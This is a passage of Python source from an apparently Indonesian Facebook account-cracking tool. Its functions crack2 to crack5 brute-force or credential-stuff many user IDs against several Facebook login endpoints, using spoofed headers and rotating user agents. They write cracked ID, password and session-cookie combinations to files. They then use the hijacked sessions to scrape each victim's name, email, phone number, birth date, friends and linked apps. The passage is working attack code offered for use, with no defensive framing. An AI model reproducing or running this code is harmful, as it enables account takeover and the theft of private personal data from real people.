					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' >_OK COY'))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f">_Nama Akun       : {nama}\n>_ Jumlah Teman    : {teman}\n>_ Jumlah Pengikut : {pengikut}\n>_Email Aktif     : {email}\n>_Nomor Aktif     : {nomer}\n>_Tahun Akun      : {tahun}\n>_Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f">_Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f">_Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	>_Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\n>_Tidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	>_Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s %s %s/%s ok*%s  cp*%s  %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s >> %s|%s >> CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%s >> %s|%s >> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s %s %s/%s  OK:%s  CP:%s  %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'>_ID : {idf} >_PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='>_Checkpoint'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f">_ Nama Akun       : {nama}\n>_ Jumlah Teman    : {teman}\n>_ Jumlah Pengikut : {pengikut}\n>_ Email Aktif     : {email}\n>_Nomor Aktif     : {nomer}\n>_Tahun Akun      : {tahun}\n>_Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f">_Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f">_Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	>_Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\n>_Tidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	>_Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack4(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s %s %s/%s  OK:%s  CP:%s  %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'mobile.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mobile.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mobile.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbaisc.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'>_ID       : {idf} >_PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='>_Checkpoint'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' >_OK COY'))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://touch.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://touch.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://touch.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://touch.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://touch.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass
					
					hit1, hit2 = 0,0
					cek =session.get("https://mbaisc.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://mbaisc.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f">_Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f">_Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	>_Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\n>_Tidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	>_Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack5(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s %s %s/%s  OK:%s  CP:%s  %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"x.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://x.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://x.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://x.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://x.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'>_ID : {idf} >_PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='>_Checkpoint'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://x.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://x.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://x.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://x.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://x.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lx\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f">_ Nama Akun       : {nama}\n>_ Jumlah Teman    : {teman}\n>_ Jumlah Pengikut : {pengikut}\n>_ Email Aktif     : {email}\n>_Nomor Aktif     : {nomer}\n>_Tahun Akun      : {tahun}\n>_Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f">_Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f">_Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	>_Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\n>_Tidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	>_Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack6(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s %s %s/%s  OK:%s  CP:%s  %s%s%s'%(bi,idf,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
